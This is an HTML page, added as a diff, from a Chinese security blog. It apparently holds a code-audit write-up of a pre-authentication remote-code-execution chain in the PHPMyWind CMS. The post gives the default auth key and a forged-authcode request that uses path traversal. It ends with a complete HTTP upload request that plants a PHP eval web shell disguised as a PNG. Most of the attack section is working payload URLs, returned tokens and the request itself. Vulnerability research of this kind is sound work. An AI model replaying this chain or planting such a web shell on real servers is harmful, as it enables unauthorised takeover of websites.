@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/PHPMyWind/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/PHPMyWind/","path":"2023/12/25/PHPMyWind/","title":"PHPMyWind前台RCE"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PHPMyWind前台RCE | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%B7%BB%E5%8A%A0"><span class="nav-text">变量添加</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E9%AA%8C%E8%AF%81"><span class="nav-text">权限验证</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%BB%E6%89%BEFILE"><span class="nav-text">寻找FILE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1"><span class="nav-text">审计</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#authkey%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="nav-text">authkey的获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/PHPMyWind/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PHPMyWind前台RCE | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHPMyWind前台RCE
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前台RCE审计一。环境：win11 + php7 + PHPMyWind v5.6.beta</p>
+<a id="more"></a>
+
+<h1 id="变量添加"><a href="#变量添加" class="headerlink" title="变量添加"></a>变量添加</h1><p>调用 _RunMagicQuotes 进行value处理，最后实现变量的添加</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116002914924.png" alt="image-20230116002914924"></p>
+<p>传入该参数的值如果为数组则递归解析，最后特殊字符 addslashes 处理</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116003014152.png" alt="image-20230116003014152"></p>
+<p>但是该变量名存在问题，可以覆盖 $_SERVER以及$_FILES </p>
+<p>然后就去搜索 <code>$_FILES</code> 的相关处理</p>
+<h1 id="权限验证"><a href="#权限验证" class="headerlink" title="权限验证"></a>权限验证</h1><p>admin的权限是通过 admin/inc/config.inc.php进行验证</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116003858266.png" alt="image-20230116003858266"></p>
+<p>代码通过<code>$_SESSION</code> 进行验证</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116003945261.png" alt="image-20230116003945261"></p>
+<h1 id="寻找FILE"><a href="#寻找FILE" class="headerlink" title="寻找FILE"></a>寻找FILE</h1><p>全局搜索后，排除admin目录</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116004222723.png" alt="image-20230116004222723"></p>
+<p>在 Controller_AvatarFlashUpload#uploadavatarAction 中，光看文件处理部分，文件最后保存路径为 upload/$uid.$filetype，$filetype通过在config中进行查找$type，$type通过getimagesize获取，这函数可伪造。基本存在利用的可能</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116010921716.png" alt="image-20230116010921716"></p>
+<p>看一下实例化的地方 data/avatar/upload.php</p>
+<p>定义$config，这里定义了一个authkey引起了我的注意</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116011510390.png" alt="image-20230116011510390"></p>
+<p>跟踪一下$cfg_auth_ley存在于 /include/common.func.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cfg_auth_key &#x3D; &#39;zVQnZqFyAn4EGmjY&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>接着通过参数a控制action。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116011559906.png" alt="image-20230116011559906"></p>
+<p>最后就是进行调用action</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116011628979.png" alt="image-20230116011628979"></p>
+<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>再次回到action中</p>
+<h2 id="authkey的获取"><a href="#authkey的获取" class="headerlink" title="authkey的获取"></a>authkey的获取</h2><p>三个函数getgpc、init_input、input</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116012500823.png" alt="image-20230116012500823"></p>
+<p>getgpc，通过GET方式获取agent参数的值</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116012649658.png" alt="image-20230116012649658"></p>
+<p>init_input</p>
+<p>先获取input参数值，然后调用 <code>common::authcode</code> 对进行input验证操作，解析到$this-&gt;input，这里两个参数有一些条件限制</p>
+<ul>
+<li><code>$this-&gt;input[&#39;agent&#39;]</code></li>
+<li><code>$this-&gt;input[&#39;time&#39;]</code></li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116012948932.png" alt="image-20230116012948932"></p>
+<p>input 就是从上面的$this-&gt;input 获取 uid 的值</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116013133796.png" alt="image-20230116013133796"></p>
+<p>综上需要控制的参数有三个</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;input[&#39;agent&#39;]</span><br><span class="line">$this-&gt;input[&#39;time&#39;]</span><br><span class="line">$this-&gt;input[&#39;uid&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>跟入 common::authcode，是一个很长的解密函数，key就是上面的 authkey 为 zVQnZqFyAn4EGmjY</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116014126064.png" alt="image-20230116014126064"></p>
+<p>有解密就有加密，这里可以根据该函数直接构造payload，但是发现authkey为随机的。所以寻找前台可控进行加密的地方</p>
+<p>全局搜索 <code>&#39;ENCODE&#39;</code> 基本都调用了 AuthCode</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116015713533.png" alt="image-20230116015713533"></p>
+<p>实现encode功能</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116015857366.png" alt="image-20230116015857366"></p>
+<p>那么就看一下哪个 AuthCode 传入参数可控，最后发现最合适在 shoppingcart.php，对三个参数没有限制，可以直接添加，但是有一个小问题，AuthCode传入的是序列化的字符串，那么在经过解密之后，通过 parse_str 之后能不能实现添加上述的三个变量</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116040401564.png" alt="image-20230116040401564"></p>
+<p>来个demo发现确实可以添加</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr &#x3D; array(</span><br><span class="line">&#39;test&#39;  &#x3D;&gt; &#39;a&amp;a&#x3D;1&amp;b&#x3D;2&amp;&#39;</span><br><span class="line">);</span><br><span class="line">$data &#x3D; serialize($arr);</span><br><span class="line">var_dump($data);</span><br><span class="line">parse_str($data, $tester);</span><br><span class="line">var_dump($tester);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"></span><br><span class="line">string(35) &quot;a:1:&#123;s:4:&quot;test&quot;;s:10:&quot;a&amp;a&#x3D;1&amp;b&#x3D;2&amp;&quot;;&#125;&quot;</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;a:1:&#123;s:4:&quot;test&quot;;s:10:&quot;a&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;a&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [&quot;b&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [&quot;&quot;;&#125;&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;shoppingcart.php?a&#x3D;addshopingcart&amp;goodsid&#x3D;1&amp;buynum&#x3D;2&amp;agent&#x3D;agent1&amp;goodsattr&#x3D;test%26time&#x3D;9999999%26uid&#x3D;1%26agent&#x3D;agent1</span><br></pre></td></tr></table></figure>
+
+<p>此时返回cookie</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">182bXpJ9OpKFGfv4%2BxS0d6fRxUkRvlNTP1wOAp5gmOfr5ES1O9z2PPDCDU2AThTdNu4sfVehuuOLX6SYCAzbtHYfBl%2B6rCJWGYJZgCR2xjnWmxdOPPzNyjT4s4dwVhacg%2FndWIu3EA4E7HTiU4y2HRmg3Rjl%2FlXNr5mQcMiqkudNxyVRWDdfB4augbECr5A540Gvc9tG7RigkUXDDdBJdBoRmVmdsep30QxEWSuQZutACZ1fPUnp</span><br></pre></td></tr></table></figure>
+
+<p>这时可以伪造并获取authcode</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>观察文件写入的路径为 $uid 与 $filetype 构成，uid可控为php，如果让filetype为空，即可上传php，需要注意这里是tmp路径拼接shell路径，所以需要绝对路径写文件</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/PHPMyWind/image-20230116041943675.png" alt="image-20230116041943675"></p>
+<p>获取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;shoppingcart.php?a&#x3D;addshopingcart&amp;goodsid&#x3D;1&amp;buynum&#x3D;2&amp;agent&#x3D;agent1&amp;goodsattr&#x3D;test%26time&#x3D;9999999999%26uid&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;phpstudy_pro\WWW\PHPMyWind-master\Y0shell.php%26agent&#x3D;agent1%26 </span><br><span class="line"></span><br><span class="line">authcode:</span><br><span class="line">2ec59MYBM8iGqrHi9mZlmE2PIFNru5qh0Z4nviEFLIhTG9TuIymP8iAn%2FdwD5HYNZvKqDyAPGn%2BrhwAozGUONIu0eDjJKT89LVp3V1qpRDZT19HPh7wOFuMmr4bA2g8f3FrQTtX%2BoSfshZjmPl13mGHNUpv2KYRFa%2BP34LF1YCaW08eVAUicYBiEghBv6QsRqq2HpX5hCSUSmfyn5W7B%2Bty5F3mcVik2Y575kyfu</span><br></pre></td></tr></table></figure>
+
+<p>上传文件，传入code与agent</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;data&#x2F;avatar&#x2F;upload.php?a&#x3D;uploadavatar&amp;input&#x3D;2ec59MYBM8iGqrHi9mZlmE2PIFNru5qh0Z4nviEFLIhTG9TuIymP8iAn%2FdwD5HYNZvKqDyAPGn%2BrhwAozGUONIu0eDjJKT89LVp3V1qpRDZT19HPh7wOFuMmr4bA2g8f3FrQTtX%2BoSfshZjmPl13mGHNUpv2KYRFa%2BP34LF1YCaW08eVAUicYBiEghBv6QsRqq2HpX5hCSUSmfyn5W7B%2Bty5F3mcVik2Y575kyfu&amp;agent&#x3D;agent1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.68.155</span><br><span class="line">Content-Length: 246</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarydj9apJsliR52tHup</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;107.0.0.0 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydj9apJsliR52tHup</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Filedata&quot;; filename&#x3D;&quot;test.png&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">#define width 20</span><br><span class="line">#define height 20</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">------WebKitFormBoundarydj9apJsliR52tHup--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/326936.html">我是如何通过变量覆盖挖到PHPMyWind前台RCE</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/" rel="prev" title="PHP无字母数字RCE">
+                  <i class="fa fa-angle-left"></i> PHP无字母数字RCE
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/Linux%E6%8F%90%E6%9D%83%20CVE-2021-4034/" rel="next" title="Linux提权 CVE-2021-4034">
+                  Linux提权 CVE-2021-4034 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
